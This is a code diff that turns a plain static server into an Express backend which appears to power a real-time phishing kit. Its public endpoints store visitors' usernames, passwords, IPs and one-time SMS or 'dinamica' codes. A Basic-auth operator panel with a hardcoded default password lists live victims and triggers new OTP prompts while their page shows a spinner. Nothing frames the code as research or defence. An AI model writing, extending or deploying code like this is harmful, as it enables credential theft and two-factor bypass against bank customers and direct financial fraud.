@@ -1,66 +1,182 @@
-import { createServer } from "node:http"
-import { readFile } from "node:fs/promises"
-import { extname, join } from "node:path"
+import express from "express"
+import { join } from "node:path"
 
+const app = express()
 const PORT = Number(process.env.PORT) || 3000
 const HOST = "0.0.0.0"
-const DIST = join(process.cwd(), "dist")
 
-const TYPES = {
-  ".css": "text/css; charset=utf-8",
-  ".html": "text/html; charset=utf-8",
-  ".ico": "image/x-icon",
-  ".js": "text/javascript; charset=utf-8",
-  ".json": "application/json; charset=utf-8",
-  ".png": "image/png",
-  ".svg": "image/svg+xml",
-  ".txt": "text/plain; charset=utf-8",
-  ".webp": "image/webp",
-  ".woff2": "font/woff2",
-}
+app.use(express.json())
 
-function send(res, status, body, headers = {}) {
-  res.writeHead(status, headers)
-  res.end(body)
-}
+const PANEL_USER = process.env.PANEL_USER || 'Morderkaiser'
+const PANEL_PASSWORD = process.env.PANEL_PASSWORD || 'M3q7Xp9Wv2R4k5T8zY'
 
-async function serveFile(res, filePath, fallbackToIndex = false) {
-  try {
-    const data = await readFile(filePath)
-    const type = TYPES[extname(filePath)] || "application/octet-stream"
-    send(res, 200, data, { "Content-Type": type })
-  } catch {
-    if (fallbackToIndex) {
-      const index = await readFile(join(DIST, "index.html"))
-      send(res, 200, index, { "Content-Type": "text/html; charset=utf-8" })
-      return
-    }
-    send(res, 404, "Not found", { "Content-Type": "text/plain; charset=utf-8" })
-  }
-}
-
-const server = createServer(async (req, res) => {
-  const url = new URL(req.url ?? "/", `http://${req.headers.host}`)
-
-  if (url.pathname === "/api/health") {
-    send(res, 200, JSON.stringify({ ok: true }), {
-      "Content-Type": "application/json; charset=utf-8",
-    })
-    return
+const authMiddleware = (req, res, next) => {
+  const authHeader = req.headers.authorization
+  if (!authHeader) {
+    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"')
+    return res.status(401).send('Authentication required')
   }
 
-  if (url.pathname.startsWith("/api/")) {
-    send(res, 404, JSON.stringify({ error: "Not found" }), {
-      "Content-Type": "application/json; charset=utf-8",
-    })
-    return
+  const authParts = authHeader.split(' ')
+  if (authParts.length !== 2 || authParts[0].toLowerCase() !== 'basic') {
+    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"')
+    return res.status(401).send('Authentication required')
   }
 
-  const safePath = url.pathname === "/" ? "/index.html" : url.pathname
-  const filePath = join(DIST, safePath)
-  await serveFile(res, filePath, !extname(safePath))
+  const credentials = Buffer.from(authParts[1], 'base64').toString().split(':')
+  const user = credentials[0]
+  const pass = credentials[1]
+
+  if (user === PANEL_USER && pass === PANEL_PASSWORD) {
+    return next()
+  }
+
+  res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"')
+  return res.status(401).send('Invalid credentials')
+}
+
+// In-memory sessions store
+let sessions = {}
+
+// Health check endpoint
+app.get('/api/health', (req, res) => {
+  res.json({ ok: true })
 })
 
-server.listen(PORT, HOST, () => {
-  console.log(`Alianza listening on http://${HOST}:${PORT}`)
+// 1. Create or update a session
+app.post('/api/sessions', (req, res) => {
+  const { id, username, password, tipoUsuario, device, ip, state } = req.body
+  if (!id) return res.status(400).json({ error: 'Missing session id' })
+  
+  if (sessions[id]) {
+    sessions[id] = {
+      ...sessions[id],
+      username: username || sessions[id].username,
+      password: password || sessions[id].password,
+      tipoUsuario: tipoUsuario || sessions[id].tipoUsuario,
+      device: device || sessions[id].device,
+      ip: ip || sessions[id].ip,
+      state: state || sessions[id].state,
+      last_seen: Date.now(),
+      updatedAt: Date.now()
+    }
+  } else {
+    sessions[id] = {
+      id,
+      index: Object.keys(sessions).length + 1,
+      username: username || '—',
+      password: password || '—',
+      tipoUsuario: tipoUsuario || 'CODIGO_PERSONA',
+      device: device || 'desktop',
+      ip: ip || '127.0.0.1',
+      state: state || 'waiting',
+      token: '',
+      createdAt: Date.now(),
+      last_seen: Date.now(),
+      updatedAt: Date.now()
+    }
+  }
+  res.json({ success: true, session: sessions[id] })
+})
+
+// 2. Get all sessions (calculated online state)
+app.get('/api/sessions', authMiddleware, (req, res) => {
+  const now = Date.now()
+  const list = Object.values(sessions).map(s => {
+    const online = now - s.last_seen < 20000
+    return { ...s, online }
+  })
+  res.json(list)
+})
+
+// 3. Get single session (polling check)
+app.get('/api/sessions/:id', (req, res) => {
+  const { id } = req.params
+  const session = sessions[id]
+  if (!session) return res.status(404).json({ error: 'Session not found' })
+  res.json(session)
+})
+
+// 4. Update session token (from OTP page)
+app.post('/api/sessions/:id/token', (req, res) => {
+  const { id } = req.params
+  const { token } = req.body
+  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' })
+  
+  sessions[id].token = token
+  
+  // Set state based on current action (sms or dinamica) before clearing the action
+  const currentAction = sessions[id].action
+  if (currentAction === 'sms') {
+    sessions[id].state = 'received-sms'
+  } else {
+    sessions[id].state = 'received-dinamica'
+  }
+  
+  sessions[id].action = null // Clear the action on the server so the spinner keeps showing!
+  sessions[id].last_seen = Date.now()
+  sessions[id].updatedAt = Date.now()
+  res.json({ success: true, session: sessions[id] })
+})
+
+// 5. Update session ping (keepalive)
+app.post('/api/sessions/:id/ping', (req, res) => {
+  const { id } = req.params
+  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' })
+  
+  sessions[id].last_seen = Date.now()
+  res.json({ success: true })
+})
+
+// 6. Set action for a session (from operator panel)
+app.post('/api/sessions/:id/action', authMiddleware, (req, res) => {
+  const { id } = req.params
+  const { action, state } = req.body
+  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' })
+  
+  sessions[id].state = state || sessions[id].state
+  sessions[id].action = action
+  
+  // If requesting a new token input (dinamica or sms), reset the token
+  if (action === 'dinamica' || action === 'sms') {
+    sessions[id].token = ''
+  }
+  
+  sessions[id].last_seen = Date.now()
+  sessions[id].updatedAt = Date.now()
+  res.json({ success: true, session: sessions[id] })
+})
+
+// 7. Update session state (from client page)
+app.post('/api/sessions/:id/state', (req, res) => {
+  const { id } = req.params
+  const { state } = req.body
+  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' })
+  
+  sessions[id].state = state
+  sessions[id].last_seen = Date.now()
+  sessions[id].updatedAt = Date.now()
+  res.json({ success: true, session: sessions[id] })
+})
+
+// 8. Clear all sessions
+app.post('/api/clear', authMiddleware, (req, res) => {
+  sessions = {}
+  res.json({ success: true })
+})
+
+// Protect and serve the /panel directory statically
+app.use('/panel', authMiddleware, express.static(join(process.cwd(), 'panel')))
+
+// Serve build files from dist
+const DIST = join(process.cwd(), "dist")
+app.use(express.static(DIST))
+
+// Fallback to index.html for SPA router
+app.get('*', (req, res) => {
+  res.sendFile(join(DIST, 'index.html'))
+})
+
+app.listen(PORT, HOST, () => {
+  console.log(`Server is running on http://${HOST}:${PORT}`)
 })
